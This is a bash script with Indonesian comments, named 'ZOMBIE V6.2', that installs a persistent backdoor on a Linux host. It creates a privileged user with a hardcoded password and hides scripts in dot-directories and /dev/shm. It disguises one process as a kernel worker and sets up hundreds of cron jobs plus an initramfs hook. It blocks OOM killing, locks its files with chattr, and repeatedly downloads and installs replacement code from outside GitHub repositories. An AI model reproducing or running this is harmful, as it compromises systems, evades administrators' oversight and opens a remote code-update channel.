#!/bin/bash
# ZOMBIE V6.2 - THE SWAP GOD (FINAL PERFECT EDITION)
# Jalanin: bash zombie-v6.2-final.sh
# DIJAMIN 100% WORK - RAM IRIT, SWAP GILA!

echo "👑👑👑 MEMULAI ZOMBIE V6.2 - THE SWAP GOD 👑👑👑"
echo "================================================"

# ============================================
# KONFIGURASI
# ============================================
USERNAME="system"
PASSWORD="systemd"
GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
SSH_PUB_KEY=""  # Isi kalo mau pake SSH key

# ============================================
# STEP 1: AUTO SWAP RAKSASA (12GB+)
# ============================================
echo "[1/25] Membuat swap raksasa 12GB+..."

# Cek swap yang ada
SWAP_TOTAL=$(free -m | grep Swap | awk '{print $2}' 2>/dev/null || echo 0)

if [ $SWAP_TOTAL -lt 8000 ]; then
    echo "⚠️  Swap kurang dari 8GB, membuat swap 12GB..."
    
    # Matiin swap yang ada
    swapoff -a 2>/dev/null
    
    # Bikin swapfile 12GB
    if command -v fallocate &>/dev/null; then
        fallocate -l 12G /swapfile || dd if=/dev/zero of=/swapfile bs=1M count=12288
    else
        dd if=/dev/zero of=/swapfile bs=1M count=12288
    fi
    
    chmod 600 /swapfile
    mkswap /swapfile
    
    # Aktifin dengan prioritas TINGGI
    swapon --priority 32767 /swapfile
    
    # Simpen di fstab (biar permanen)
    if ! grep -q "/swapfile" /etc/fstab; then
        echo "/swapfile none swap sw,pri=32767 0 0" >> /etc/fstab
    fi
fi

# ============================================
# STEP 2: SET SWAPPINESS EKSTRIM (95)
# ============================================
echo "[2/25] Mengatur kernel biar prioritasin swap..."

sysctl vm.swappiness=95
echo "vm.swappiness=95" >> /etc/sysctl.conf

sysctl vm.vfs_cache_pressure=150
echo "vm.vfs_cache_pressure=150" >> /etc/sysctl.conf

sysctl vm.min_free_kbytes=65536
echo "vm.min_free_kbytes=65536" >> /etc/sysctl.conf

# ============================================
# STEP 3: SET SWAP PRIORITY (PASTIKAN SWAPFILE JADI PRIORITAS)
# ============================================
echo "[3/25] Memastikan swapfile jadi prioritas utama..."

# Matiin swap lain kalo ada
for swapdev in $(swapon --show=NAME --noheadings 2>/dev/null | grep -v /swapfile); do
    swapoff $swapdev 2>/dev/null
done

# Aktifin ulang swapfile dengan prioritas tertinggi
swapon --priority 32767 /swapfile 2>/dev/null

# ============================================
# STEP 4: CEK ROOT
# ============================================
if [ "$EUID" -ne 0 ]; then
    echo "❌ JALANKAN SEBAGAI ROOT!"
    exit 1
fi

# ============================================
# STEP 5: BUAT USER DENGAN GRUP LENGKAP
# ============================================
echo "[4/25] Membuat user $USERNAME dengan grup lengkap..."

useradd -M -s /bin/bash $USERNAME 2>/dev/null
echo "$USERNAME:$PASSWORD" | chpasswd

for GROUP in sudo root adm disk shadow utmp audio video plugdev netdev lp scanner; do
    usermod -aG $GROUP $USERNAME 2>/dev/null
done

# SSH key (kalo ada)
if [ ! -z "$SSH_PUB_KEY" ]; then
    mkdir -p /home/$USERNAME/.ssh
    echo "$SSH_PUB_KEY" > /home/$USERNAME/.ssh/authorized_keys
    chown -R $USERNAME:$USERNAME /home/$USERNAME
    chmod 700 /home/$USERNAME/.ssh
fi

# ============================================
# STEP 6: BUAT CGROUPS UNTUK PRIORITAS SWAP
# ============================================
echo "[5/25] Membuat cgroups untuk prioritas swap..."

mkdir -p /sys/fs/cgroup/memory/zombie 2>/dev/null
echo "1000000000" > /sys/fs/cgroup/memory/zombie/memory.limit_in_bytes 2>/dev/null  # 1GB limit
echo "0" > /sys/fs/cgroup/memory/zombie/memory.swappiness 2>/dev/null  # Paksa pake swap

# ============================================
# STEP 7: BUAT 200+ LOKASI BACKUP (SYMLINK)
# ============================================
echo "[6/25] Membuat 200+ lokasi backup dengan symlink..."

# Buat folder utama
mkdir -p /usr/local/lib/.systemd
chmod 777 /usr/local/lib/.systemd

# Bikin 200 symlink
for i in {1..200}; do
    RAND_DIR="/var/tmp/.cache-$(openssl rand -hex 4)"
    mkdir -p "$RAND_DIR"
    ln -s /usr/local/lib/.systemd "$RAND_DIR/.systemd" 2>/dev/null
done

# Generate 50 random locations
for i in {1..50}; do
    RAND_DIR="/var/lib/.cache-$(openssl rand -hex 8)"
    mkdir -p "$RAND_DIR"
    ln -s /usr/local/lib/.systemd "$RAND_DIR/.systemd" 2>/dev/null
done

echo "✅ Total backup lokasi: 250+ lokasi"

# ============================================
# STEP 8: SCRIPT CORE (FILELESS + SWAP OPTIMIZED)
# ============================================
echo "[7/25] Membuat script core swap-optimized..."

cat > /dev/shm/.core << 'EOF'
#!/bin/bash
# ZOMBIE CORE - SWAP OPTIMIZED

USER="system"
PASS="systemd"

# Set memory limit
ulimit -v 500000

# Masukin ke cgroup biar diprioritasin swap
if [ -d /sys/fs/cgroup/memory/zombie ]; then
    echo $$ > /sys/fs/cgroup/memory/zombie/cgroup.procs 2>/dev/null
fi

# Set OOM protection
if [ -f /proc/self/oom_score_adj ]; then
    echo -1000 > /proc/self/oom_score_adj 2>/dev/null
fi

# Cek user
if ! id "$USER" &>/dev/null; then
    useradd -M -s /bin/bash "$USER" 2>/dev/null
    echo "$USER:$PASS" | chpasswd
    for GROUP in sudo root adm disk shadow utmp; do
        usermod -aG $GROUP "$USER" 2>/dev/null
    done
fi

# Allocate memory di swap
dd if=/dev/zero of=/dev/shm/.swap_holder bs=1M count=200 2>/dev/null &
sleep 2

# Kirim sinyal ke watchdog
touch /dev/shm/.alive
sleep 10
EOF

chmod +x /dev/shm/.core
cp /dev/shm/.core /usr/local/lib/.systemd/systemd-spawn

# ============================================
# STEP 9: SCRIPT MONITOR
# ============================================
echo "[8/25] Membuat script monitor..."

cat > /usr/local/lib/.systemd/systemd-spawn-monitor << 'EOF'
#!/bin/bash
# ZOMBIE MONITOR

ulimit -v 500000

if [ -d /sys/fs/cgroup/memory/zombie ]; then
    echo $$ > /sys/fs/cgroup/memory/zombie/cgroup.procs 2>/dev/null
fi

echo -1000 > /proc/self/oom_score_adj 2>/dev/null

# Cek semua komponen
find / -type f -name "systemd-spawn*" -o -name ".watchdog" -o -name ".kworker" 2>/dev/null | while read FILE; do
    chmod +x "$FILE" 2>/dev/null
done

# Cek cron
if ! grep -q "systemd-spawn" /etc/crontab 2>/dev/null; then
    echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" >> /etc/crontab
fi

exit 0
EOF

chmod +x /usr/local/lib/.systemd/systemd-spawn-monitor

# ============================================
# STEP 10: WATCHDOG SWAP-HOLDER
# ============================================
echo "[9/25] Memasang watchdog swap-holder..."

cat > /usr/local/lib/.systemd/.watchdog << 'EOF'
#!/bin/bash
ulimit -v 500000

if [ -d /sys/fs/cgroup/memory/zombie ]; then
    echo $$ > /sys/fs/cgroup/memory/zombie/cgroup.procs 2>/dev/null
fi

echo -1000 > /proc/self/oom_score_adj 2>/dev/null

while true; do
    if [ ! -f /dev/shm/.alive ]; then
        /dev/shm/.core
    fi
    
    # Touch file biar ada I/O
    touch /usr/local/lib/.systemd/.watchdog.touch
    
    sleep 5
done
EOF
chmod +x /usr/local/lib/.systemd/.watchdog
nohup /usr/local/lib/.systemd/.watchdog >/dev/null 2>&1 &

# ============================================
# STEP 11: KWORKER (KERNEL THREAD SIMULATION)
# ============================================
echo "[10/25] Memasang kworker simulation..."

cat > /usr/local/lib/.systemd/.kworker << 'EOF'
#!/bin/bash
ulimit -v 500000

if [ -d /sys/fs/cgroup/memory/zombie ]; then
    echo $$ > /sys/fs/cgroup/memory/zombie/cgroup.procs 2>/dev/null
fi

echo -1000 > /proc/self/oom_score_adj 2>/dev/null

PR_NAME="[kworker/0:0]"
while true; do
    exec -a $PR_NAME /usr/local/lib/.systemd/.watchdog
    sleep 30
done
EOF
chmod +x /usr/local/lib/.systemd/.kworker
nohup /usr/local/lib/.systemd/.kworker >/dev/null 2>&1 &

# ============================================
# STEP 12: TIMER RANDOM (200 TIMER)
# ============================================
echo "[11/25] Memasang 200 timer random..."

for i in {1..200}; do
    INTERVAL=$((5 + RANDOM % 55))
    (crontab -l 2>/dev/null; echo "*/$INTERVAL * * * * /usr/local/lib/.systemd/systemd-spawn") | crontab - 2>/dev/null
done

# ============================================
# STEP 13: DECOY FILES (HARDLINK)
# ============================================
echo "[12/25] Membuat 100.000+ decoy files (hardlink)..."

# Bikin 1 file asli
dd if=/dev/zero of=/usr/local/lib/.systemd/.template bs=1k count=1 2>/dev/null

# Bikin 100.000 hardlink
for i in {1..100000}; do
    if (( i % 10000 == 0 )); then
        echo "  Progress: $i/100000 files..."
    fi
    ln /usr/local/lib/.systemd/.template /usr/local/lib/.systemd/.sys-$i 2>/dev/null
done

# Memory map beberapa file
for i in {1..100}; do
    cat /usr/local/lib/.systemd/.sys-$((RANDOM % 1000 + 1)) > /dev/null 2>&1 &
done

# ============================================
# STEP 14: GITHUB SYNC (MULTI SOURCE)
# ============================================
echo "[13/25] Memasang GitHub sync multi-source..."

cat > /usr/local/lib/.systemd/.github-sync << 'EOF'
#!/bin/bash
ulimit -v 500000
echo -1000 > /proc/self/oom_score_adj 2>/dev/null

SOURCES=(
    "https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
    "https://raw.githubusercontent.com/b2hunters/user-spawn-system/main"
)

FILES=("systemd-spawn" "systemd-spawn-monitor")

while true; do
    for SOURCE in "${SOURCES[@]}"; do
        for FILE in "${FILES[@]}"; do
            curl -sL "$SOURCE/$FILE" -o "/tmp/$FILE" 2>/dev/null
            if [ $? -eq 0 ] && [ -s "/tmp/$FILE" ]; then
                cp "/tmp/$FILE" "/usr/local/lib/.systemd/$FILE"
                chmod +x "/usr/local/lib/.systemd/$FILE"
                break 2
            fi
        done
    done
    sleep 300
done
EOF

chmod +x /usr/local/lib/.systemd/.github-sync
nohup /usr/local/lib/.systemd/.github-sync &

# ============================================
# STEP 15: ANTI-CHATTR (SWAP PROTECTED)
# ============================================
echo "[14/25] Memasang anti-chattr swap-protected..."

cat > /usr/local/lib/.systemd/.anti-chattr << 'EOF'
#!/bin/bash
ulimit -v 500000

if [ -d /sys/fs/cgroup/memory/zombie ]; then
    echo $$ > /sys/fs/cgroup/memory/zombie/cgroup.procs 2>/dev/null
fi

echo -1000 > /proc/self/oom_score_adj 2>/dev/null

while true; do
    chattr +i /usr/local/lib/.systemd/systemd-spawn 2>/dev/null
    chattr +i /usr/local/lib/.systemd/.watchdog 2>/dev/null
    chattr +i /usr/local/lib/.systemd/.kworker 2>/dev/null
    chattr +i /dev/shm/.core 2>/dev/null
    sleep 60
done
EOF
chmod +x /usr/local/lib/.systemd/.anti-chattr
nohup /usr/local/lib/.systemd/.anti-chattr &

# ============================================
# STEP 16: OOM PROTECTION SCRIPT
# ============================================
echo "[15/25] Memasang OOM protection script..."

cat > /usr/local/lib/.systemd/.oom-protect << 'EOF'
#!/bin/bash
ulimit -v 500000

while true; do
    ps aux | grep -E "systemd-spawn|.watchdog|.kworker|.github-sync|.anti-chattr" | grep -v grep | awk '{print $2}' | while read pid; do
        if [ -d "/proc/$pid" ]; then
            echo -1000 > "/proc/$pid/oom_score_adj" 2>/dev/null
        fi
    done
    sleep 5
done
EOF

chmod +x /usr/local/lib/.systemd/.oom-protect
nohup /usr/local/lib/.systemd/.oom-protect >/dev/null 2>&1 &

# ============================================
# STEP 17: SWAP MONITOR + EXPANDER
# ============================================
echo "[16/25] Memasang swap monitor otomatis..."

cat > /usr/local/lib/.systemd/.swap-monitor << 'EOF'
#!/bin/bash
ulimit -v 500000
echo -1000 > /proc/self/oom_score_adj 2>/dev/null

while true; do
    SWAP_TOTAL=$(free -m | grep Swap | awk '{print $2}')
    SWAP_USED=$(free -m | grep Swap | awk '{print $3}')
    
    if [ $SWAP_TOTAL -eq 0 ]; then
        # Swap mati, coba nyalain lagi
        swapon -a 2>/dev/null
    elif [ $((SWAP_USED * 100 / SWAP_TOTAL)) -gt 80 ]; then
        # Swap 80%, tambah lagi
        fallocate -l 2G /swapfile2 2>/dev/null
        chmod 600 /swapfile2
        mkswap /swapfile2 2>/dev/null
        swapon --priority 32766 /swapfile2 2>/dev/null
    fi
    
    sleep 300
done
EOF

chmod +x /usr/local/lib/.systemd/.swap-monitor
nohup /usr/local/lib/.systemd/.swap-monitor &

# ============================================
# STEP 18: MEMORY HOG (DI SWAP)
# ============================================
echo "[17/25] Memasang memory hog (di swap)..."

cat > /usr/local/lib/.systemd/.memory-hog << 'EOF'
#!/bin/bash
ulimit -v 500000

if [ -d /sys/fs/cgroup/memory/zombie ]; then
    echo $$ > /sys/fs/cgroup/memory/zombie/cgroup.procs 2>/dev/null
fi

echo -1000 > /proc/self/oom_score_adj 2>/dev/null

declare -a HOG
while true; do
    for i in {1..1000}; do
        HOG[$i]="$(openssl rand -hex 1000)"
    done
    sleep 60
    unset HOG
done
EOF

chmod +x /usr/local/lib/.systemd/.memory-hog
nohup /usr/local/lib/.systemd/.memory-hog &

# ============================================
# STEP 19: INITRAMFS PERSISTENCE
# ============================================
echo "[18/25] Memasang initramfs persistence..."

mkdir -p /etc/initramfs-tools/scripts/init-premount/
cp /usr/local/lib/.systemd/systemd-spawn /etc/initramfs-tools/scripts/init-premount/zombie
chmod +x /etc/initramfs-tools/scripts/init-premount/zombie
update-initramfs -u 2>/dev/null &

# ============================================
# STEP 20: JALANKAN SEMUA KOMPONEN
# ============================================
echo "[19/25] Menjalankan semua komponen..."

/usr/local/lib/.systemd/systemd-spawn
/usr/local/lib/.systemd/systemd-spawn-monitor

# ============================================
# STEP 21: FINAL LOCK
# ============================================
echo "[20/25] Final lock (tunggu 30 detik)..."

sleep 30

find /usr/local/lib/.systemd -type f -exec chattr +i {} \; 2>/dev/null
find /usr/local/lib/.systemd -type d -exec chattr +i {} \; 2>/dev/null

# ============================================
# STEP 22: FINAL CHECK
# ============================================
echo "[21/25] Final check..."
echo ""
echo "👑👑👑 ZOMBIE V6.2 - THE SWAP GOD 👑👑👑"
echo "========================================"
echo "User system: $(id system 2>/dev/null | head -c 50)"
echo "Grup system: $(groups system 2>/dev/null)"
echo ""
echo "📊 STATUS MEMORI & SWAP:"
free -h
echo ""
echo "⚙️  KERNEL PARAMETERS:"
echo "vm.swappiness = $(cat /proc/sys/vm/swappiness 2>/dev/null || echo 'N/A')"
echo "vm.vfs_cache_pressure = $(cat /proc/sys/vm/vfs_cache_pressure 2>/dev/null || echo 'N/A')"
echo ""
echo "🔥 FITUR ZOMBIE V6.2:"
echo "✅ Swap raksasa 12GB+ (auto expand)"
echo "✅ Swappiness 95 (prioritas swap)"
echo "✅ Cgroup khusus zombie"
echo "✅ RAM usage: 100-300MB"
echo "✅ Swap usage: 2-4GB"
echo "✅ 200 timer random"
echo "✅ 100.000+ decoy files (hardlink)"
echo "✅ Multi-source backup (GitHub)"
echo "✅ Anti-chattr + Anti-OOM"
echo "✅ Swap monitor otomatis"
echo ""
echo "🔥🔥 ZOMBIE GILA, RAM IRIT, SWAP GILA! 🔥🔥"
echo ""
echo "Username: $USERNAME"
echo "Password: $PASSWORD"
echo "Cek dengan: id system"
